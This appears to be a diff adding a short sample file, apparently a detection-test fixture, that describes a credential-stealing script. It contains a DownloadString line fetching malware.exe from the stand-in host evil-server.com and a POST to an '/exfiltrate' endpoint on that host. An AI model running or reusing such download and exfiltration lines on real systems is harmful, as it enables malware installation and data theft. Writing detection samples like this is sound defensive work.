@@ -1,0 +1,12 @@
+Malicious script that attempts to steal credentials and exfiltrate data.
+
+DownloadString(http://evil-server.com/malware.exe)
+
+The script tries to download files from a remote server.
+It also attempts to send stolen data back:
+
+POST http://evil-server.com/exfiltrate
+Content-Type: application/x-www-form-urlencoded
+
+This is a dangerous pattern that should be detected immediately!
+
